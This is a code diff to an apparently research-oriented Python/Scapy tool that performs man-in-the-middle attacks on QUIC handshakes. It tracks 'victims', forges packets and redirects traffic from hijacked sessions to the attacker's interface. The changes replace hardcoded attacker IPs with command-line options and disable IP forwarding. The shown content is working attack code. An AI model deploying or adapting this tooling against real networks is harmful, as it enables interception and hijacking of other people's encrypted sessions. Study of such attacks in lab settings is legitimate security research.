@@ -11,7 +11,7 @@ bind_layers(UDP, QUIC, dport=443, sport=443)
 
 from forge import forge_cc_scapy
 import threading, sys, os, multiprocessing
-from victims import Victims
+from victims import Victims, IPv4Address
 from quic_protected import *
 from test_server.server import main
 
@@ -52,7 +52,7 @@ def send_attack2(victim, ver = "V2"):
 
 def add_and_send_to_server(pkt):
     new_pkt = pkt[IP]
-    new_pkt[IP].src = "10.69.0.100"
+    new_pkt[IP].src = attacker_outer_iface_ip
     del new_pkt.getlayer(IP).chksum
     del new_pkt.getlayer(UDP).chksum
     #print(f"New PKT to server: {new_pkt.summary()}")
@@ -100,7 +100,7 @@ def handle_quic(pkt):
                     return
                 elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                     new_pkt = pkt[IP]
-                    new_pkt[IP].dest = "192.168.1.1"
+                    new_pkt[IP].dest = attacker_inner_iface_ip
                     new_pkt[UDP].dport = 4433
                     del new_pkt.getlayer(IP).chksum
                     del new_pkt.getlayer(UDP).chksum
@@ -132,6 +132,7 @@ if __name__ == "__main__":
     """
         Global variables, constants and configurations settings.
     """
+    os.system('sysctl -w net.ipv4.ip_forward=0')
     parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
     parser.add_argument(
         "--inner-iface",
@@ -145,11 +146,33 @@ if __name__ == "__main__":
         default='middlebox-eth1',
         help="The name of the interface/network adapter that connects the middlebox to the Router/WAN network.",
     )
+    parser.add_argument(
+        "--outer-iface-ip",
+        type=str,
+        default="10.69.0.100",
+        help="The ip of the middlebox in the interface to the Router/WAN network.",
+    )
+    parser.add_argument(
+        "--inner-iface-ip",
+        type=str,
+        default="192.168.1.1",
+        help="The ip of the middlebox in the interface to the LAN network.",
+    )
     args = parser.parse_args()
     
     ##TODO: add changing of those while running 
     inner_iface = args.inner_iface
+    try:
+        attacker_inner_iface_ip = IPv4Address(args.inner_iface_ip)
+    except Exception as e:
+        print(e)
+        os._exit(1)
     outer_iface = args.outer_iface
+    try:
+        attacker_outer_iface_ip = IPv4Address(args.outer_iface_ip)
+    except Exception as e:
+        print(e)
+        os._exit(1)
     vs = Victims()
     #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
     control_panel_thread = threading.Thread(target=vs.run)
